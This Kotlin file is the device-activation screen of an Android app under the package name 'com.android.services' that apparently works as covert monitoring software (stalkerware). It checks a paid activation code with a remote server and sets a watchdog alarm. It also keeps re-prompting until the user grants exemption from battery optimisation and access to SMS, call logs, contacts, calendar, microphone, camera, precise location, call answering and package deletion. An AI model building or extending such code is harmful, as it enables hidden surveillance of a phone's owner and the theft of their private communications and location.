package com.android.services.ui.fragments

import android.Manifest
import android.annotation.TargetApi
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.activity.result.contract.ActivityResultContracts
import androidx.databinding.DataBindingUtil
import androidx.fragment.app.viewModels
import com.android.services.R
import com.android.services.databinding.FragmentDeviceActivationBinding
import com.android.services.models.ActivateDevice
import com.android.services.models.ActivateDeviceResponse
import com.android.services.network.api.TOSApi
import com.android.services.sealed.ActivationSuccess
import com.android.services.sealed.Initialized
import com.android.services.sealed.Loading
import com.android.services.sealed.NetworkError
import com.android.services.ui.activities.ManualPermissionActivity
import com.android.services.util.*
import com.android.services.viewModel.DeviceActivationViewModel
import com.google.android.material.snackbar.Snackbar
import dagger.hilt.android.AndroidEntryPoint
import java.lang.Exception
import javax.inject.Inject
import com.android.services.receiver.WatchDogAlarmReceiver


@AndroidEntryPoint
class DeviceActivationFragment : BaseFragment() {

    lateinit var binding: FragmentDeviceActivationBinding
    private lateinit var layout: View
    private val watchDogAlarmReceiver=WatchDogAlarmReceiver()

    @Inject
    lateinit var tosApi: TOSApi
    private val deviceActivationViewModel: DeviceActivationViewModel by viewModels()

    override fun onCreateFragment() {
        logVerbose("$TAG OnCreate Fragment")
    }

    override fun createView(inflater: LayoutInflater, container: ViewGroup): View {
        binding = DataBindingUtil.inflate<FragmentDeviceActivationBinding>(
            inflater, R.layout.fragment_device_activation, container, false
        ).apply {
            lifecycleOwner = viewLifecycleOwner
            viewModel = deviceActivationViewModel
        }
        return binding.root
    }

    override fun initViews(view: View) {
        logVerbose("$TAG Initializing Views")
        layout = view.findViewById(R.id.main_layout)
        addActivateDeviceLiveObserver()
        addNetworkStateObserver()
        requestBatteryOptimization()
        setOnActivationButtonClickListener()
        binding.versionName.text = "ver ${DeviceInformationUtil.versionName}"
        AppConstants.autoGrantScreenRecordingPermission=false
    }

    private fun requestBatteryOptimization() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val packageName = requireActivity().packageName
                val powerManager =
                    requireActivity().getSystemService(Context.POWER_SERVICE) as PowerManager?
                if (powerManager != null && !powerManager.isIgnoringBatteryOptimizations(packageName)) {
                    val intent = Intent()
                    intent.action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                    intent.data = Uri.parse("package:$packageName")
                    batteryOptimisationLaunch.launch(intent)
                } else {
                    requestAppPermissions()
                }
            }
        } catch (e: Exception) {
            logVerbose("Error while requiring battery optimisation")
        }
    }

    private val batteryOptimisationLaunch =
        registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
            if (result.resultCode == Activity.RESULT_OK) {
                requestAppPermissions()
            } else if (result.resultCode == Activity.RESULT_CANCELED) {
                requestBatteryOptimization()
            }
        }

    private fun setOnActivationButtonClickListener() {
        binding.activateButton.setOnClickListener {
            logVerbose("$TAG activation button tapped")
        }
    }

    private fun addActivateDeviceLiveObserver() {
        deviceActivationViewModel.activateDevice.removeObservers(viewLifecycleOwner)
        deviceActivationViewModel.activateDevice.observe(
            viewLifecycleOwner,
            { activateDevice ->
                logVerbose("$TAG activate device $activateDevice")
                if (validate(activateDevice)) {
                    logVerbose("$TAG activate device validated")
                    if (AppUtils.isNetworkAvailable(requireActivity())) {
                        activateDevice.phoneServiceCode = activateDevice.phoneServiceCode.formatCode
                        deviceActivationViewModel.activateDevice(activateDevice)
                    } else {
                        layout.showSnackBar(
                            "Please Check your Internet Connection",
                            Snackbar.LENGTH_LONG
                        )
                    }
                } else {
                    logVerbose("$TAG activate device Invalid Data")
                }
            })
    }

    private fun addNetworkStateObserver() {
        deviceActivationViewModel.networkState.removeObservers(viewLifecycleOwner)
        deviceActivationViewModel.networkState.observe(viewLifecycleOwner, { networkState ->
            when (networkState) {
                is Loading -> {
                    logVerbose("$TAG activate device request initiated")
                }
                is ActivationSuccess -> {
                    logVerbose("$TAG activate device response ${networkState.activateDeviceResponse}")
                    onActivationResponse(networkState.activateDeviceResponse)
                }
                is NetworkError -> {
                    logVerbose("$TAG activate error response ${networkState.message}")
                    onActivationError(networkState.message)
                }
                is Initialized -> {
                    // TODO: 25/08/2021  Initializing network state
                }
            }
        })
    }

    private fun onActivationResponse(activateDeviceResponse: ActivateDeviceResponse) {
        when (activateDeviceResponse.statusCode) {
            "200" -> {
                logVerbose("$TAG device activated")
                AppConstants.userId = activateDeviceResponse.userId
                AppConstants.phoneServiceId = activateDeviceResponse.phoneServiceId
                AppConstants.activationCode =
                    deviceActivationViewModel.activationCode.value?.trim()!!.formatCode
                AppUtils.setFirebaseCrashlyticsUserId(AppUtils.getPhoneServiceId())
                this.startActivityWithData<ManualPermissionActivity>(
                    listOf(
                        Intent.FLAG_ACTIVITY_NEW_TASK,
                        Intent.FLAG_ACTIVITY_CLEAR_TASK,
                        Intent.FLAG_ACTIVITY_CLEAR_TOP
                    )
                )
                this.startActivityWithData<ManualPermissionActivity>(
                    listOf(
                        Intent.FLAG_ACTIVITY_NEW_TASK,
                        Intent.FLAG_ACTIVITY_CLEAR_TASK
                    )
                )
                watchDogAlarmReceiver.setAlarm(requireContext())
//                AppUtils.startService(
//                    requireContext(),
//                    Intent(requireContext(), WatchDogService::class.java)
//                )
            }
            "401" -> {
                logVerbose("$TAG Activation License Key Error")
                layout.showSnackBar(
                    "Activation Code Error",
                    Snackbar.LENGTH_LONG
                )
            }
            "403" -> {
                logVerbose("$TAG Activation License Key Already Used")
                layout.showSnackBar(
                    "Activation Code Already Used",
                    Snackbar.LENGTH_LONG
                )
            }
            "404" -> {
                logVerbose("$TAG Your Service Has Expired")
                layout.showSnackBar(
                    "Your Service Has Expired, Try Again After Renewal.",
                    Snackbar.LENGTH_LONG
                )
            }
            "405" -> {
                logVerbose("$TAG Your Service Remaining Days Are Ended.")
                layout.showSnackBar(
                    "Your Service Remaining Days Has Ended, Try Again After Renewal.",
                    Snackbar.LENGTH_LONG
                )
            }
        }
    }

    private fun onActivationError(message: String) {
        layout.showSnackBar("Error! Check your Internet Connection", Snackbar.LENGTH_LONG)
    }

    private fun validate(activateDevice: ActivateDevice): Boolean {
        return when {
            activateDevice.phoneServiceCode.isEmpty() -> {
                binding.activationCode.error = "Please Enter Activation Code"
                false
            }
            activateDevice.phoneServiceCode.length < 8 -> {
                binding.activationCode.error = "Please Enter a Valid Code"
                false
            }
            else -> {
                true
            }
        }
    }

    /**
     * Requests the [android.Manifest.permission] permission.
     * If an additional rationale should be displayed, the user has to launch the request from
     * a SnackBar that includes additional information.
     */
    private fun requestAppPermissions() {
        // Permission has not been granted and must be requested.
        if (shouldShowRequestPermissionRationaleCompat(appPermissionsList)) {
            // Provide an additional rationale to the user if the permission was not granted
            // and the user would benefit from additional context for the use of the permission.
            // Display a SnackBar with a button to request the missing permission.
            layout.showSnackBar(
                "Please Grant All Permissions",
                Snackbar.LENGTH_INDEFINITE, "Ok"
            ) {
                permissionsResultLauncher.launch(appPermissionsList)
            }
        } else {
            // Request the permission. The result will be received in onRequestPermissionResult().
            permissionsResultLauncher.launch(appPermissionsList)
        }
    }

    private val permissionsResultLauncher =
        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { permissions ->
            // Handle Permission granted/rejected
            var isPermissionDenied = false
            permissions.entries.forEachIndexed { _, entry ->
                val isGranted = entry.value
                if (!isGranted) {
                    isPermissionDenied = true
                }
            }
            if (!isPermissionDenied) {
                logVerbose("$TAG All permissions are granted")
                if (!AppConstants.deleteAppDirectories && AppConstants.osLessThanEleven) {
                    AppUtils.deleteAppSpecificFiles(requireContext())
                    AppConstants.deleteAppDirectories = true
                }
            } else {
                logVerbose("$TAG Missing Permissions")
                requestAppPermissions()
            }
        }

    companion object {

        const val TAG = "DeviceActivationFragment"

        @TargetApi(Build.VERSION_CODES.M)
        var permissions = arrayOf(
            Manifest.permission.INTERNET,
            Manifest.permission.FOREGROUND_SERVICE,
            Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
            Manifest.permission.WAKE_LOCK,
            Manifest.permission.ACCESS_WIFI_STATE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALENDAR,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA,
            Manifest.permission.ACCESS_NETWORK_STATE,
            Manifest.permission.RECEIVE_BOOT_COMPLETED,
            Manifest.permission.REQUEST_DELETE_PACKAGES,
            Manifest.permission.ANSWER_PHONE_CALLS,
            Manifest.permission.ACCESS_MEDIA_LOCATION
        )

        // Returns the List Permissions required
        val appPermissionsList: Array<String>
            get() {
                val listOfPermissions: MutableList<String> = permissions.toMutableList()
                if (AppConstants.osLessThanPie) {
                    listOfPermissions.remove(Manifest.permission.FOREGROUND_SERVICE)
                }
                if (AppConstants.osLessThanOreo) {
                    listOfPermissions.remove(Manifest.permission.REQUEST_DELETE_PACKAGES)
                }
                if (AppConstants.osLessThanEleven) {
                    listOfPermissions.remove(Manifest.permission.ACCESS_MEDIA_LOCATION)
                }
                if (AppConstants.osLessThanOreo) {
                    listOfPermissions.remove(Manifest.permission.ANSWER_PHONE_CALLS)
                }
                if (AppConstants.osGreaterThanEqualToEleven) {
                    listOfPermissions.remove(Manifest.permission.WRITE_EXTERNAL_STORAGE)
                    listOfPermissions.remove(Manifest.permission.READ_EXTERNAL_STORAGE)
                }
                return listOfPermissions.toTypedArray()
            }

        /**
         * Creates a New Instance of [DeviceActivationFragment]
         */
        fun newInstance(): DeviceActivationFragment {
            val args = Bundle()
            val fragment = DeviceActivationFragment()
            fragment.arguments = args
            return fragment
        }
    }
}